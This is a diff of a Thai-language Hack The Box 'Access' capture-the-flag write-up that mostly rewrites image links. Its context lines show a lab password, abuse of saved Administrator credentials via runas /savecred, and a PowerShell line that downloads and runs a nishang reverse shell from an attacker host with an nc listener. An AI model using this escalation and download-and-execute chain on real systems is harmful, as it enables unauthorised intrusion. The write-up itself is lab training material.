@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
 
 ## TCP 80 
 
-![[Challenge/HTB Challenge/Access/IMG/001.png]]
+![](./IMG/001.png)
 
 ### Directory Bruteforce 
 ```bash
@@ -157,7 +157,8 @@ Compressed: 10870
 ```
 
 ข้อมูลก่อนหน้าเราจะได้ข้อมูล Password มาด้วย ให้ทำการทดสอบแตกไฟล์และใช้รหัสผ่านเป็น 'access4u@security' ก็จะสามารถแตกไฟล์ได้
-![[Challenge/HTB Challenge/Access/IMG/002.png]]
+
+![](./IMG/002.png)
 
 หากเราตรวจสอบข้อมูลของไฟล์ Access Control.pst จะพบว่าเป็นไฟล์อีเมลล์ของ outlook โดยเราสามารถใช้คำสั่ง readpst ได้ 
 
@@ -173,7 +174,8 @@ Processing Folder "Deleted Items"
 ```
 
 เมื่อเราใช้คำสั่ง read pst เมล์ต่างๆ จะอยู่ใน Format ที่สามารถอ่านได้ 
-![[Challenge/HTB Challenge/Access/IMG/003.png]]
+
+![](./IMG/003.png)
 
 ซึ่งหลังจากที่เราอ่านจะทำให้เราเห็นข้อความที่น่าสนใจ 
 
@@ -196,7 +198,8 @@ John
 ## TCP 23 Telnet 
 
 เราสามารถทดสอบด้วย Telnet ซึ่งจะทำให้เราสามารถเข้าถึงเป้าหมายได้ 
-![[Challenge/HTB Challenge/Access/IMG/004.png]]
+
+![](./IMG/004)
 
 # Shell as admin
 
@@ -204,7 +207,8 @@ John
 cd C:\Users\Public\Desktop\
 type "ZKAccess3.5 Security System.lnk"
 ```
-![[Challenge/HTB Challenge/Access/IMG/005.png]]
+
+![](./IMG/005)
 
 จากการวิเคราะห์พบว่าไฟล์ .lnk มีการเรียกใช้คำสั่ง runas พร้อมกับ flag /savedcred ซึ่งบ่งชี้ว่าอาจมีการเก็บข้อมูล credentials (บัญชีผู้ใช้และรหัสผ่าน) ของ Administrator ไว้ในระบบแล้ว และเพื่อยืนยันข้อสันนิษฐานหรือใช้ในกระบวนการตรวจสอบก่อนพบไฟล์ .lnk ก็สามารถใช้คำสั่ง:
 
@@ -212,7 +216,7 @@ type "ZKAccess3.5 Security System.lnk"
 cmdkey /list
 ```
 
-![[Challenge/HTB Challenge/Access/IMG/006.png]]
+![](./IMG/006.png)
 
 จากเหตุการณ์ดังกล่าวทำให้เราทราบได้ว่า user administrator ได้ถูกเก็บไว้บนเครื่องเป้าหมายแล้ว 
 
@@ -226,7 +230,8 @@ git clone https://github.com/samratashok/nishang.git
 cp ./nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/shell.ps1
 ```
 
-![[Challenge/HTB Challenge/Access/IMG/007.png]]
+![](./IMG/007.png)
+
 เราจะเพิ่ม Config สำหรับทำ reverse shell จากไฟล์ Invoke-PowerShellTcp.ps1  โดยเราเพิ่มบรรทัดสุดท้ายตามภาพ จากนั้นฝั่ง kali linux เราก็จะทำการรอรับ Reverse shell
 
 ```bash
@@ -238,7 +243,6 @@ rlwrap nc -lvmp 443
 ## Victim 
 C:\Users\security\AppData\Local\Temp>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.9/shell.ps1')"
 ```
-
-![[Challenge/HTB Challenge/Access/IMG/008.png]]
+![](./IMG/008.png)
 
 # Pwned 
